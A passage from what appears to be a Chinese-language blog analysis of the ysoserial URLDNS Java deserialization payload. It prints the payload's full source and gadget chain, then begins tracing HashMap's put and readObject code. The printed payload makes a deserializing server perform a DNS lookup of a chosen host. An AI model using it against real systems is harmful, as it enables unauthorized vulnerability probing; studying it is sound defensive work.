data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Authors</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Dependencies</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PayloadTest</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PayloadRunner</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Reflections</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * A blog post with more details about this gadget chain is at the url below:</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</pre></td></tr><tr><td data-num=\"20\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"21\"></td><td><pre> *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog</pre></td></tr><tr><td data-num=\"22\"></td><td><pre> *   posting describing how he modified the Java Commons Collections gadget</pre></td></tr><tr><td data-num=\"23\"></td><td><pre> *   in ysoserial to open a URL. This takes the same idea, but eliminates</pre></td></tr><tr><td data-num=\"24\"></td><td><pre> *   the dependency on Commons Collections and does a DNS lookup with just</pre></td></tr><tr><td data-num=\"25\"></td><td><pre> *   standard JDK classes.</pre></td></tr><tr><td data-num=\"26\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"27\"></td><td><pre> *   The Java URL class has an interesting property on its equals and</pre></td></tr><tr><td data-num=\"28\"></td><td><pre> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> *   during a comparison (either equals or hashCode).</pre></td></tr><tr><td data-num=\"30\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"31\"></td><td><pre> *   As part of deserialization, HashMap calls hashCode on each key that it</pre></td></tr><tr><td data-num=\"32\"></td><td><pre> *   deserializes, so using a Java URL object as a serialized key allows</pre></td></tr><tr><td data-num=\"33\"></td><td><pre> *   it to trigger a DNS lookup.</pre></td></tr><tr><td data-num=\"34\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"35\"></td><td><pre> *   Gadget Chain:</pre></td></tr><tr><td data-num=\"36\"></td><td><pre> *     HashMap.readObject()</pre></td></tr><tr><td data-num=\"37\"></td><td><pre> *       HashMap.putVal()</pre></td></tr><tr><td data-num=\"38\"></td><td><pre> *         HashMap.hash()</pre></td></tr><tr><td data-num=\"39\"></td><td><pre> *           URL.hashCode()</pre></td></tr><tr><td data-num=\"40\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"41\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"42\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"rawtypes\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"unchecked\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token annotation punctuation\">@PayloadTest</span><span class=\"token punctuation\">(</span>skip <span class=\"token operator\">=</span> <span class=\"token string\">\"true\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token annotation punctuation\">@Dependencies</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token annotation punctuation\">@Authors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">Authors</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GEBL</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">URLDNS</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ObjectPayload</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token comment\">//Avoid DNS resolution during payload creation</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                <span class=\"token comment\">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                <span class=\"token class-name\">URLStreamHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SilentURLStreamHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                <span class=\"token class-name\">HashMap</span> ht <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// HashMap that will contain the URL</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token class-name\">URL</span> u <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// URL to use as the Key</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                ht<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> <span class=\"token string\">\"hashCode\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                <span class=\"token keyword\">return</span> ht<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token class-name\">PayloadRunner</span><span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token constant\">URLDNS</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>         * &lt;p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>         * using the serialized object.&lt;/p></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>         *</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>         * &lt;b>Potential false negative:&lt;/b></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>         * &lt;p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>         * second resolution.&lt;/p></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>         */</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SilentURLStreamHandler</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">URLStreamHandler</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                <span class=\"token keyword\">protected</span> <span class=\"token class-name\">URLConnection</span> <span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                <span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">InetAddress</span> <span class=\"token function\">getHostAddress</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>就是</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">URLDNS</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ObjectPayload</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">getObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> url<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token comment\">//Avoid DNS resolution during payload creation</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token comment\">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token class-name\">URLStreamHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SilentURLStreamHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token class-name\">HashMap</span> ht <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// HashMap that will contain the URL</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token class-name\">URL</span> u <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// URL to use as the Key</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                ht<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token class-name\">Reflections</span><span class=\"token punctuation\">.</span><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> <span class=\"token string\">\"hashCode\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token keyword\">return</span> ht<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token class-name\">PayloadRunner</span><span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token constant\">URLDNS</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>         * &lt;p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>         * using the serialized object.&lt;/p></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>         *</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>         * &lt;b>Potential false negative:&lt;/b></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>         * &lt;p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>         * second resolution.&lt;/p></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>         */</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SilentURLStreamHandler</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">URLStreamHandler</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token keyword\">protected</span> <span class=\"token class-name\">URLConnection</span> <span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">InetAddress</span> <span class=\"token function\">getHostAddress</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>从 payload 分析</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span> ht <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// HashMap that will contain the URL</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token class-name\">URL</span> u <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// URL to use as the Key</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                ht<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></pre></td></tr></table></figure><p>这里的代码是用来新建哈希图类和 url 类调用 HashMap 的 put 方法，</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">V</span> <span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span> key<span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个就是 put 方法</p>\n<p>现在开始就是直接从 HashMap 的 readObject 方法开始</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream<span class=\"token punctuation\">.</span>GetField</span> fields <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// Read loadFactor (ignore threshold)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">float</span> lf <span class=\"token operator\">=</span> fields<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"loadFactor\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.75f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lf <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">Float</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNaN</span><span class=\"token punctuation\">(</span>lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal load factor: \"</span> <span class=\"token operator\">+</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        lf <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.25f</span><span class=\"token punctuation\">,</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">HashMap<span class=\"token punctuation\">.</span>UnsafeHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">putLoadFactor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">reinitialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                <span class=\"token comment\">// Read and ignore number of buckets</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">int</span> mappings <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Read number of mappings (size)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal mappings count: \"</span> <span class=\"token operator\">+</span> mappings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// use defaults</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">float</span> fc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span><span class=\"token punctuation\">)</span>mappings <span class=\"token operator\">/</span> lf <span class=\"token operator\">+</span> <span class=\"token number\">1.0f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">int</span> cap <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fc <span class=\"token operator\">&lt;</span> <span class=\"token constant\">DEFAULT_INITIAL_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                       <span class=\"token constant\">DEFAULT_INITIAL_CAPACITY</span> <span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                       <span class=\"token punctuation\">(</span>fc <span class=\"token operator\">>=</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                       <span class=\"token constant\">MAXIMUM_CAPACITY</span> <span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                       <span class=\"token function\">tableSizeFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>fc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span 